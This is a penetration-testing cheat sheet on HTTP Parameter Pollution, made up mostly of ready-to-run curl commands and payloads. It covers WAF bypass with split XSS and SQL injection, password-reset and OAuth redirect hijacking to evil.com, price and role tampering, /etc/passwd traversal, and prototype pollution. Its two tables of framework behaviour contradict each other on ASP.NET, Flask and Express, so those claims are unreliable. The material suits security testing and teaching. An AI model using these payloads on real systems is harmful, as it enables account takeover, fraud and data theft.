# HTTP Parameter Pollution (HPP)

## How HPP Works

HTTP Parameter Pollution exploits how web applications handle multiple occurrences of the same parameter name in a request. When duplicate parameters are sent (e.g., `?id=1&id=2`), different server technologies resolve the conflict differently. Attackers exploit these inconsistencies — especially when multiple layers (WAF, proxy, application server) each pick a different value from the duplicates.

The core attack: send the same parameter multiple times with different values. One layer sees the "safe" value, another layer processes the "malicious" value.

```
# Basic HPP - same parameter, two values
https://target.com/search?q=safe&q=malicious
```

## Server Behavior by Technology

How each technology resolves duplicate parameters (`?param=first&param=second`):

- **ASP.NET/IIS**: Uses FIRST occurrence → `first`
- **PHP/Apache**: Uses LAST occurrence → `second`
- **Python/Flask**: Builds array of all values → `['first', 'second']`
- **JSP/Tomcat**: Uses FIRST occurrence → `first`
- **Node.js/Express**: Uses FIRST occurrence → `first` (default querystring parser)
- **Perl CGI/Apache**: Concatenates with comma → `first,second`

Modern caveats:
- Express with `qs` parser (extended mode) may produce arrays or use last value
- Spring MVC collects duplicates into lists
- API gateways (Kong, APIGEE, Cloudflare) may normalize differently than backends
- JSON duplicate keys: most parsers use last-wins semantics

## Server-Side HPP

Server-side HPP targets the backend processing layer. The attacker manipulates parameters that are processed entirely on the server.

### WAF Bypass by Splitting Payloads

When a WAF inspects the first parameter but the backend uses the last:

```bash
# WAF sees "safe", backend processes "<script>alert(1)</script>"
curl "https://target.com/search?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E"
```

### Backend Logic Manipulation

Overriding business logic parameters:

```bash
# Override transfer recipient (backend uses last on PHP)
curl -X POST https://target.com/transfer \
  -d "to=legitimate_account&amount=500&to=attacker_account"

# Override access level
curl "https://target.com/admin?access=false&access=true"

# API gateway picks first id, backend picks last -> IDOR
curl "https://target.com/api/user?id=123&id=999"
```

### Parameter Precedence Between Layers

When URL params and POST body both contain the same parameter, servers may prefer one over the other:

```bash
# URL has one value, body has another
curl -X POST "https://target.com/action?role=user" \
  -d "role=admin"
```

## Client-Side HPP

Client-side HPP targets parameters that get reflected into links, forms, or JavaScript on the page. The attacker crafts a URL with polluted parameters that, when visited by a victim, causes malicious values to appear in client-rendered content.

### Reflected Parameters in Links

If an application reflects a parameter into a share link or redirect:

```bash
# Original page generates: <a href="/share?url=PAGE_URL">
# Attacker adds a duplicate that gets reflected into the link
curl "https://target.com/article?page=1&url=https://evil.com"
```

### Social Engineering via URL Manipulation

Polluting social sharing buttons:

```bash
# Manipulate share URL to point to attacker site
curl "https://target.com/article?u=https://attacker.com&text=Click+here+for+free+money"

# Pollute redirect parameter
curl "https://target.com/login?redirect=/dashboard&redirect=https://evil.com/phish"
```

### Testing for Client-Side HPP

```bash
# Check if duplicate params get reflected in page source
curl -s "https://target.com/page?param=CANARY1&param=CANARY2" | grep -i "canary"
```

## WAF Bypass via HPP

HPP is one of the most effective WAF bypass techniques. The WAF inspects one occurrence while the backend processes another.

### Split SQL Injection Across Parameters

```bash
# Single param blocked by WAF:
# ?id=1 OR 1=1

# Split across duplicates - WAF sees "1", PHP backend sees "OR 1=1"
curl "https://target.com/product?id=1&id=OR+1%3D1"

# More complex SQLi split (Perl backend concatenates with comma)
# Backend receives: "1,UNION SELECT password FROM users--"
curl "https://target.com/product?id=1&id=UNION+SELECT+password+FROM+users--"

# ASP.NET concatenation variant (some configs join with comma)
curl "https://target.com/product?id=1+UNION/*&id=*/SELECT/*&id=*/password/*&id=*/FROM/*&id=*/users"
```

### Split XSS Across Parameters

```bash
# Single param blocked by WAF:
# ?q=<script>alert(1)</script>

# Split the payload - WAF checks first, PHP uses last
curl "https://target.com/search?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E"

# Event handler split (if backend concatenates)
curl "https://target.com/search?q=%3Cimg+src%3Dx+on&q=error%3Dalert(1)%3E"

# Perl backend concatenation produces: "<img src=x on,error=alert(1)>"
# Some browsers may still execute depending on context
```

### Encoding Variations for Extra Evasion

```bash
# Combine HPP with URL encoding
curl "https://target.com/search?q=safe&q=%253Cscript%253Ealert(1)%253C/script%253E"

# Case variation (some servers treat PARAM and param as same)
curl "https://target.com/search?q=safe&Q=%3Cscript%3Ealert(1)%3C/script%3E"

# Parameter cloaking with encoded param name
curl "https://target.com/search?q=safe&%71=%3Cscript%3Ealert(1)%3C/script%3E"
```

## Practical Test Cases

### Step 1: Fingerprint Server Behavior

```bash
# Determine which value the server uses
curl -s "https://target.com/search?test=FIRST&test=LAST" | grep -Ei "(FIRST|LAST)"

# Test with POST body
curl -s -X POST "https://target.com/api/endpoint" \
  -d "param=FIRST&param=LAST"

# Test URL vs body precedence
curl -s -X POST "https://target.com/api/endpoint?param=URL_VALUE" \
  -d "param=BODY_VALUE"
```

### Step 2: Test Parameter Override

```bash
# Access control bypass
curl -v "https://target.com/admin?admin=false&admin=true"

# User context switching
curl -v "https://target.com/profile?user_id=attacker_id&user_id=victim_id"

# Role escalation
curl -X POST "https://target.com/api/update" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "role=user&role=admin&action=update"
```

### Step 3: Test WAF Bypass

```bash
# XSS bypass attempt
curl -v "https://target.com/search?q=hello&q=<script>alert(document.cookie)</script>"

# SQLi bypass attempt
curl -v "https://target.com/items?category=electronics&category=electronics'+OR+'1'%3D'1"

# Path traversal via HPP
curl -v "https://target.com/file?path=/public/doc.pdf&path=/etc/passwd"
```

### Step 4: Test JSON Duplicate Keys

```bash
# JSON body with duplicate keys (most parsers use last value)
curl -X POST "https://target.com/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"amount": 1, "amount": 99999, "to": "legitimate", "to": "attacker"}'
```

### Step 5: Test Cookie/Header Pollution

```bash
# Duplicate cookies
curl -v "https://target.com/dashboard" \
  -H "Cookie: session=valid_session; session=attacker_session"

# Duplicate headers
curl -v "https://target.com/api/data" \
  -H "X-User-Role: user" \
  -H "X-User-Role: admin"
```

### Step 6: Test Array Notation Confusion

```bash
# PHP array notation
curl "https://target.com/filter?role[]=user&role[]=admin"

# Mixed notation
curl "https://target.com/filter?role=user&role[]=admin&role[0]=superadmin"

# Rails-style indexed
curl "https://target.com/filter?ids[0]=1&ids[1]=2&ids[0]=999"
```

## Common Vulnerable Patterns

### Payment Amount Manipulation

```bash
# Override price on PHP backend (uses last value)
curl -X POST "https://target.com/checkout" \
  -d "item=premium_plan&amount=99.99&amount=0.01"

# Override quantity
curl -X POST "https://target.com/cart/update" \
  -d "product_id=123&quantity=1&quantity=1000"

# Discount code stacking via pollution
curl -X POST "https://target.com/apply-coupon" \
  -d "code=SAVE10&code=SAVE10&code=SAVE10"
```

### Email Parameter Manipulation

```bash
# Password reset to attacker email (backend uses last on PHP)
curl -X POST "https://target.com/forgot-password" \
  -d "email=victim@target.com&email=attacker@evil.com"

# Notification redirect
curl -X POST "https://target.com/settings/notifications" \
  -d "notify_email=user@legit.com&notify_email=attacker@evil.com"

# Account verification sent to wrong address
curl -X POST "https://target.com/verify" \
  -d "user=victim&email=victim@target.com&email=attacker@evil.com"
```

### Redirect URL Manipulation

```bash
# Open redirect via HPP
curl -v "https://target.com/login?redirect=/dashboard&redirect=https://evil.com/phish"

# OAuth redirect_uri pollution
curl -v "https://target.com/oauth/authorize?client_id=legit&redirect_uri=https://legit.com/callback&redirect_uri=https://evil.com/steal"

# Post-logout redirect
curl -v "https://target.com/logout?next=/login&next=https://evil.com"
```

### Additional Vulnerable Patterns

```bash
# File path override
curl "https://target.com/download?file=public.pdf&file=../../etc/passwd"

# Search filter bypass
curl "https://target.com/api/users?role=public&role=admin&include_deleted=false&include_deleted=true"

# Rate limit bypass via parameter confusion
curl -X POST "https://target.com/api/login" \
  -d "username=admin&password=guess1&username=admin&password=guess2&username=admin&password=guess3"
```

## Testing Checklist

1. Fingerprint the server technology and determine parameter precedence
2. Test duplicate params in URL query string
3. Test duplicate params in POST body
4. Test URL param vs POST body conflict
5. Test JSON duplicate keys
6. Test cookie and header duplication
7. Test array notation variations
8. Attempt WAF bypass with split payloads
9. Test business logic params (amount, email, redirect, role)
10. Test across different content types (form-urlencoded, JSON, multipart)
11. Document which layer processes which occurrence for the report

---

## Framework-Specific HPP Behavior

| Framework | Duplicate Param Handling |
|-----------|-------------------------|
| PHP/Apache | Last occurrence wins |
| ASP.NET/IIS | All occurrences concatenated with comma |
| Python/Flask | First occurrence wins |
| Python/Django | Last occurrence (QueryDict) |
| Node/Express | Array of all values |
| Java/Tomcat | First occurrence wins |
| Ruby/Rack | Last occurrence wins |
| Go/net/http | First occurrence wins |

### Exploitation Pattern
```
# PHP (last wins) — bypass WAF that checks first param
?search=safe&search=<script>alert(1)</script>

# ASP.NET (concat) — split payload across params
?id=1+UNION&id=+SELECT+password+FROM+users

# Express (array) — type confusion
?role=user&role=admin  → req.query.role = ["user","admin"]
```

## Array Injection

```
# PHP array notation
?user_id[]=1&user_id[]=2        → array
?user[name]=admin&user[role]=god → nested object

# Express/Node bracket notation
?ids[0]=1&ids[1]=2              → ["1","2"]

# JSON body array confusion
{"id": 1}  →  {"id": [1, 2]}   → may bypass parseInt checks
{"id": 1}  →  {"id": {"id": 1}} → nested object confusion
```

## JSON Key Pollution

```json
// Duplicate keys — parser-dependent (last wins in most implementations)
{"role": "user", "role": "admin"}

// Prototype pollution (Node/Express)
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Unicode key confusion
{"role": "user", "r\u006fle": "admin"}

// Whitespace in keys
{"role": "user", " role": "admin"}
```
